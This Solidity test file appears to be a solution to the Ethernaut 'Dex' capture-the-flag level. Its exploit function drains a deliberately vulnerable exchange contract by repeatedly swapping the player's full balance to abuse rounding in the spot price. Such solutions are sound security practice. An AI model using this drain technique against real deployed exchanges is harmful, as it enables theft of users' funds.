// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Dex.sol";
import "src/levels/DexFactory.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestDex is BaseTest {
    Dex private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(token1.balanceOf(address(level)) == 100 && token2.balanceOf(address(level)) == 100, true);
        assertEq(token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Solve the Challenge
        bool token1IsFirst = true;
        while (token1.balanceOf(levelAddress) > 0 && token2.balanceOf(levelAddress) > 0) {
            if (token1IsFirst) {
                if (token1.balanceOf(player) > token1.balanceOf(levelAddress)) {
                    level.approve(levelAddress, token1.balanceOf(levelAddress));
                    level.swap(address(token1), address(token2), token1.balanceOf(levelAddress));
                }
                else {
                    level.approve(levelAddress, token1.balanceOf(player));
                    level.swap(address(token1), address(token2), token1.balanceOf(player));
                }
            }
            else {
                if (token2.balanceOf(player) > token2.balanceOf(levelAddress)) {
                    level.approve(levelAddress, token2.balanceOf(levelAddress));
                    level.swap(address(token2), address(token1), token2.balanceOf(levelAddress));
                }
                else {
                    level.approve(levelAddress, token2.balanceOf(player));
                    level.swap(address(token2), address(token1), token2.balanceOf(player));
                }
            }
            token1IsFirst = !token1IsFirst;
        }

        vm.stopPrank();
    }
}
